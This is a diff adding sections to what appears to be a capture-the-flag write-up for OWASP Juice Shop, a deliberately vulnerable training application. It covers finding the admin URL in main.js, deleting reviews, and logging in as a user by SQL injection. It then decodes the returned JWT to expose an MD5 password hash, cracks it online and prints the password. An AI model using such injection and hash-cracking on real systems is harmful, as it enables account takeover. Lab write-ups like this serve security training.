@@ -125,3 +125,64 @@ admin@juice-sh.op';--
 
 Cool! We have logged in!
 
+## 03 Visit admin section
+This challenge is pretty easy, all you have to do is go through the main.js and search admin. After a bit of filtering, you wll find the URL
+```text
+/administration
+```
+After logging into admin, you can just visit this URL and you have completed the challenge
+![admin section](https://github.com/HanozDar/challenges/blob/master/owasp-js/images/admin-section.png)
+
+## 04 Delete 5 Star reviews
+Pretty ez, just press the deleet button lmao
+
+## 05 Login to McSafeSearch without injection
+So from the /administration, we can find the username of McSafeSearch
+```text
+mc.safesearch@juice-sh.op
+```
+
+Now we can login to the account with SQL injection using that same payload
+```text
+mc.safesearch@juice-sh.op';--
+```
+
+When we observe the response, we can see that there is a JWT token sent back
+```text
+"authentication":{"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6OCwidXNlcm5hbWUiOiIiLCJlbWFpbCI6Im1jLnNhZmVzZWFyY2hAanVpY2Utc2gub3AiLCJwYXNzd29yZCI6ImIwM2Y0YjBiYThiNDU4ZmEwYWNkYzAyY2RiOTUzYmM4IiwiaXNBZG1pbiI6ZmFsc2UsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6ImRlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIyLTAxLTA4IDAwOjEwOjE2LjU5NyArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDIyLTAxLTA4IDAwOjEwOjE2LjU5NyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2NDE2MDM0NTIsImV4cCI6MTY0MTYyMTQ1Mn0.Yd4m-F13f6lsA2Ns5NbaiIdSVnrNIWnvFmyVNiTbJ1HKwXo4djn1pvhWlGk5HQZzQDPgxeC2GosbYy6B0JW-7EOPPHqbd5-m5Xw2NJ_d9G0ydsewi4KkJPuJ7Rb2WuFBW5KhQ31c7qAlmjoKgw2ky5Id3M09vPRO6suTtPjR4xE","bid":6,"umail":"mc.safesearch@juice-sh.op"}}
+```
+
+Now, if we decode this token, 
+```text
+{
+  "status": "success",
+  "data": {
+    "id": 8,
+    "username": "",
+    "email": "mc.safesearch@juice-sh.op",
+    "password": "b03f4b0ba8b458fa0acdc02cdb953bc8",
+    "isAdmin": false,
+    "lastLoginIp": "0.0.0.0",
+    "profileImage": "default.svg",
+    "totpSecret": "",
+    "isActive": true,
+    "createdAt": "2022-01-08 00:10:16.597 +00:00",
+    "updatedAt": "2022-01-08 00:10:16.597 +00:00",
+    "deletedAt": null
+  },
+  "iat": 1641603452,
+  "exp": 1641621452
+}
+```
+
+It tells us the password, but it seems like it is hashed. My guess is that it is an MD5 hash
+Now let's pass it to an online MD5 hash breaker and see what it thinks
+
+And we have the password!
+GG bois
+```text
+Mr. N00dles
+```
+
+Now we login, and we have solved the challenge!
+
